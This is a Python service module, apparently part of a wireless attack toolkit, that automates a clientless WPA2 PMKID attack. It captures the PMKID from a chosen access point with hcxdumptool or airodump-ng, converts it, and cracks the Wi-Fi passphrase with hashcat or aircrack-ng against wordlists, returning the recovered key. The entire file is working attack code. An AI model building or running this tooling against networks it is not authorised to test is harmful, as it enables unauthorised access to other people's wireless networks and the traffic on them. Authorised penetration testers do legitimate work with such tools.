"""
PMKID Attack Service — Clientless WPA2 cracking.

The PMKID is found in the first EAPOL message sent by the AP during authentication.
Unlike traditional handshake capture, this does NOT require any clients to be connected.
The attacker sends an association request and the AP responds with the PMKID.

Tools: hcxdumptool (capture) + hcxpcapngtool (convert) + hashcat/aircrack-ng (crack)
Fallback: airodump-ng can also capture PMKID (shown in Notes column as "PMKID")
"""

import uuid
import glob
import asyncio
import logging
import re
from datetime import datetime
from typing import Optional
from app.config import settings
from app.models.schemas import PmkidCaptureRequest, PmkidCrackRequest, ScanStatus
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class PmkidService:
    def __init__(self):
        self._captures: dict[str, dict] = {}

    async def capture_pmkid(self, req: PmkidCaptureRequest) -> dict:
        """
        Capture PMKID from target AP.
        Strategy 1: Use hcxdumptool if available (preferred)
        Strategy 2: Fallback to airodump-ng PMKID capture
        """
        cap_id = str(uuid.uuid4())[:8]
        output_file = str(settings.PMKID_DIR / f"pmkid_{cap_id}")

        # Try hcxdumptool first
        hcx_available = await self._check_hcxdumptool()

        if hcx_available:
            result = await self._capture_with_hcxdumptool(req, cap_id, output_file)
        else:
            result = await self._capture_with_airodump(req, cap_id, output_file)

        self._captures[cap_id] = result
        return result

    async def _capture_with_hcxdumptool(self, req, cap_id, output_prefix) -> dict:
        """Capture using hcxdumptool (modern, preferred method)."""
        pcapng_file = f"{output_prefix}.pcapng"

        # Create filter file for target BSSID
        filter_file = f"{output_prefix}_filter.txt"
        bssid_clean = req.target_bssid.replace(":", "").lower()
        with open(filter_file, "w") as f:
            f.write(bssid_clean + "\n")

        cmd = [
            "hcxdumptool",
            "-i", req.interface,
            "-o", pcapng_file,
            "--filterlist_ap", filter_file,
            "--filtermode", "2",  # Only target listed APs
            "--enable_status", "3",
        ]
        if req.channel:
            cmd.extend(["-c", str(req.channel)])

        managed = await process_manager.run(cmd, timeout=req.timeout)

        pmkid_found = False
        pmkid_hash_file = None

        # Convert pcapng to hashcat format
        if glob.glob(f"{output_prefix}*.pcapng"):
            hash_file = f"{output_prefix}.22000"
            convert_cmd = ["hcxpcapngtool", "-o", hash_file, pcapng_file]
            conv_result = await process_manager.run(convert_cmd, timeout=30)

            if conv_result.return_code == 0:
                try:
                    with open(hash_file) as f:
                        content = f.read()
                    pmkid_found = len(content.strip()) > 0
                    if pmkid_found:
                        pmkid_hash_file = hash_file
                except FileNotFoundError:
                    pass

        return {
            "id": cap_id,
            "method": "hcxdumptool",
            "pmkid_captured": pmkid_found,
            "pcapng_file": pcapng_file,
            "hash_file": pmkid_hash_file,
            "target_bssid": req.target_bssid,
            "channel": req.channel,
            "timeout": req.timeout,
            "output": "\n".join(managed.stdout_lines[-20:]),
        }

    async def _capture_with_airodump(self, req, cap_id, output_prefix) -> dict:
        """
        Fallback: airodump-ng also captures PMKID.
        When a PMKID is available, airodump shows 'PMKID' in the Notes column.
        """
        cmd = [
            "airodump-ng",
            "--bssid", req.target_bssid,
            "--channel", str(req.channel),
            "--write", output_prefix,
            "--output-format", "pcap,csv",
            req.interface,
        ]

        managed = await process_manager.run(cmd, timeout=req.timeout)

        # Check for PMKID in cap file
        pmkid_found = False
        cap_files = glob.glob(f"{output_prefix}*.cap")
        if cap_files:
            check_out, _, _ = await process_manager.run_sync(
                ["aircrack-ng", cap_files[0]], timeout=10
            )
            pmkid_found = "pmkid" in check_out.lower()

        return {
            "id": cap_id,
            "method": "airodump-ng",
            "pmkid_captured": pmkid_found,
            "capture_file": cap_files[0] if cap_files else None,
            "hash_file": None,
            "target_bssid": req.target_bssid,
            "channel": req.channel,
            "timeout": req.timeout,
        }

    async def crack_pmkid(self, req: PmkidCrackRequest) -> dict:
        """
        Crack PMKID hash.
        Strategy 1: hashcat -m 22000 (if .22000 file)
        Strategy 2: aircrack-ng (if .cap file)
        """
        import os
        wordlist = req.custom_wordlist_path if hasattr(req, 'custom_wordlist_path') and req.custom_wordlist_path else req.wordlist
        if not os.path.isabs(wordlist):
            for candidate in [
                str(settings.WORDLISTS_DIR / wordlist),
                f"/usr/share/wordlists/{wordlist}",
                f"/usr/share/wordlists/{wordlist}.gz",
            ]:
                if os.path.exists(candidate):
                    wordlist = candidate
                    break

        if req.pmkid_file.endswith(".22000"):
            # Hashcat mode
            cmd = [
                "hashcat", "-m", "22000",
                req.pmkid_file, wordlist,
                "--force", "--quiet",
            ]
            result = await process_manager.run(cmd, timeout=3600)
            output = "\n".join(result.stdout_lines)
            # Look for cracked key
            key_match = re.search(r":([^:]+)$", output, re.MULTILINE)
            key = key_match.group(1) if key_match else None
        else:
            # aircrack-ng fallback
            cmd = ["aircrack-ng", "-b", req.target_bssid, "-w", wordlist, req.pmkid_file]
            result = await process_manager.run(cmd, timeout=3600)
            output = "\n".join(result.stdout_lines)
            key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
            key = key_match.group(1) if key_match else None

        return {
            "success": key is not None,
            "key": key,
            "pmkid_file": req.pmkid_file,
            "target_bssid": req.target_bssid,
            "wordlist": wordlist,
        }

    async def _check_hcxdumptool(self) -> bool:
        import shutil
        return shutil.which("hcxdumptool") is not None

    def get_capture(self, cap_id: str) -> Optional[dict]:
        return self._captures.get(cap_id)

    def list_captures(self) -> list[dict]:
        return list(self._captures.values())


pmkid_service = PmkidService()
